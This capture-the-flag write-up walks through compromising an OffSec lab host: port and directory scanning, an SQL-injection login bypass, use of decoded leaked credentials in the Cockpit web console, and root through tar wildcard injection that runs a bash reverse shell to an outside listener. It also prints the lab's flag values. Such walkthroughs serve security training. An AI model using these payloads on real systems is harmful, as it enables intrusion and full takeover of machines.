# CTF Writeup: Cockpit

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.198.10 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-22 21:01 EST
Nmap scan report for 192.168.198.10
Host is up (0.031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.198.10:9090/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   32.00 ms 192.168.45.1
2   32.07 ms 192.168.45.254
3   32.44 ms 192.168.251.1
4   32.53 ms 192.168.198.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.96 seconds
```

Analyzing the webpage running port 80 seems to be an basic webpage. Let's enumerate endpoints on this.

```
dirsearch -u http://192.168.198.10      
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Methodology/Exploiting/WebExploiting/SQLi/reports/http_192.168.198.10/_25-12-22_21-38-18.txt

Target: http://192.168.198.10/

[21:38:18] Starting:                                                                                                                          
[21:38:18] 301 -  313B  - /js  ->  http://192.168.198.10/js/                
[21:38:20] 403 -  279B  - /.ht_wsr.txt                                      
[21:38:20] 403 -  279B  - /.htaccess.orig                                   
[21:38:20] 403 -  279B  - /.htaccess.bak1
[21:38:20] 403 -  279B  - /.htaccess.sample
[21:38:20] 403 -  279B  - /.htaccess.save
[21:38:20] 403 -  279B  - /.htaccess_extra
[21:38:20] 403 -  279B  - /.htaccess_orig
[21:38:20] 403 -  279B  - /.htaccessOLD
[21:38:20] 403 -  279B  - /.htaccessBAK
[21:38:20] 403 -  279B  - /.htaccess_sc                                     
[21:38:20] 403 -  279B  - /.htaccessOLD2
[21:38:20] 403 -  279B  - /.htm                                             
[21:38:20] 403 -  279B  - /.html
[21:38:20] 403 -  279B  - /.htpasswd_test                                   
[21:38:20] 403 -  279B  - /.httr-oauth
[21:38:20] 403 -  279B  - /.htpasswds
[21:38:21] 403 -  279B  - /.php                                             
[21:38:31] 301 -  314B  - /css  ->  http://192.168.198.10/css/              
[21:38:34] 301 -  314B  - /img  ->  http://192.168.198.10/img/              
[21:38:35] 200 -  456B  - /js/                                              
[21:38:36] 200 -  379B  - /login.php                                        
[21:38:36] 302 -    0B  - /logout.php  ->  login.php                        
[21:38:44] 403 -  279B  - /server-status                                    
[21:38:44] 403 -  279B  - /server-status/
```

We discovered an login.php endpoint, let's observe it.
It seems to be an login page.

Playing around with the website and testing sqli inputs like

```
user:admin'
```

Prompted us with an SQL Error

```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' AND password like '%%'' at line 1
```

I was able to bypass authentication using the following syntax in the username field.

```
admin'-- -
```

After authenticating we got forwarded to an endpoint called "password-dashboard.php" which basically
provides us with 2 usernames & there encoded passwords.

```
james:Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
cameron:dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
```

I'm assuming those passwords are encoded using base64. Let's decode them!

```
echo "Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=" | base64 -d
canttouchhhthiss@455152
```
```
echo "dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy" | base64 -d
thisscanttbetouchedd@455152
```

Unfortunately we couldn't login into ssh.

```
ssh james@192.168.198.10
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
james@192.168.198.10: Permission denied (publickey).
```

## Initial Access

But since we know that the service running on port 9090 also included an login page, we can try to use the credentials there!

I analyzed the CMS & on the Account Section I selected the user "james". Below there is an functionality which let's us add SSH Public Keys. I pasted mine in and tried to login into ssh again with user james!s

```
ssh james@192.168.198.10                     
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 23 Dec 2025 03:16:05 AM UTC

  System load:  0.01              Processes:               250
  Usage of /:   58.7% of 9.75GB   Users logged in:         1
  Memory usage: 42%               IPv4 address for ens160: 192.168.198.10
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

70 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


*** System restart required ***

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Web console: https://blaze.offsec:9090/

james@blaze:~$
```

Retrieved local.txt in /home/james directory.

```
c2127b1688403bfd8accb1f05f7dbc3c
```
## Privilege Escalation

Checking which sudo rights our current user "james" has was interesting.

```
james@blaze:~$ sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

Since I already have experience with wildcard injection priv esc. I know that this is the one!
User "james" is able to run the tar binary with sudo rights, without needing authentication.

The initial command uses the tar binary, which acts as an archiving tool and creates an compressed .tar file of the current directory we are in and stores it within the /tmp directory. Note that the wildcard (*) at the end, is our attack vector. It takes in the 1. file the 2. file the 3. and so on..

We can abuse this mechanic in order to execute an malicious reverse shell script as first input, before the files are getting compressed. Since this is being ran with sudo rights, we should get an root shell.

The Methodology is as following, we will add an checkpoint=1 variable, which makes it so our script get's executed first, before anything else.

```
james@blaze:/tmp$ touch ./"--checkpoint=1"
```

Then we will add that the checkpoint executes our shell script.

```
james@blaze:/tmp$ touch ./"--checkpoint-action=exec=sh shell.sh"
```

We will now create our shell script.

```
nano shell.sh
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.192/80 0>&1'
```

And give the script executable rights.

```
chmod +x shell.sh
```

The last step before executing the sudo command is to start up our listener on port 80 in order to catch the shell.

```
nc -lvnp 80
```

Executing the command.

```
james@blaze:/tmp$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

Gained RCE as user "root".

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.192] from (UNKNOWN) [192.168.198.10] 53068
root@blaze:/tmp#
```

Retrieved proof.txt in /root directory.

```
2a05d953d441dd00e5beddb8ebb8eb86
```
